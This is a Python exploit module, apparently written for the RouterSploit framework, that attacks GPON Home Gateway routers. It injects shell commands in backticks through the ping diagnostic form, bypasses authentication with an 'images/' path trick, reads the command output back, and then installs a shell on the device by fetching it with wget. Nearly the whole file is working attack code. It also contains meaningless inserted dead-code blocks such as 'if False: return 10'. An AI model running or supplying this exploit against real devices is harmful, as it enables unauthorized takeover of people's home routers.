import re
from time import sleep
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'GPON Home Gateway RCE', 'description': 'Module exploits GPON Home Gatewa command injection vulnerability, that allows executing commands on operating system level.', 'authors': ('VPNMentor', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/',), 'devices': ('GPON Home Gateway',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(8080, 'Target HTTP port')

    def run(self):
        if False:
            return 10
        if self.check():
            print_success('Target seems to be vulnerable')
            shell(self, architecture='mipsbe', method='wget', location='/var/tmp/')
        else:
            print_error('Exploit failed - target does not seem to be vulnerable')

    def execute(self, cmd):
        if False:
            while True:
                i = 10
        payload = '`{cmd}`;{cmd}'.format(cmd=cmd)
        data = {'XWebPageName': 'diag', 'diag_action': 'ping', 'wan_conlist': '0', 'dest_host': payload, 'ipv': '0'}
        self.http_request(method='POST', path='/GponForm/diag_Form?images/', data=data)
        response = self.retrieve_response()
        if not response:
            sleep(3)
            response = self.retrieve_response()
        return response

    def retrieve_response(self):
        if False:
            return 10
        response = self.http_request(method='GET', path='/diag.html?images/')
        if response:
            res = re.findall('diag_result = \\"(.*?)\\\\nNo traceroute test.', response.text)
            if res:
                return res[0].replace('\\n', '\n')
        return ''

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        mark = utils.random_text(12)
        cmd = 'echo {}'.format(mark)
        response = self.execute(cmd)
        if mark in response:
            return True
        return False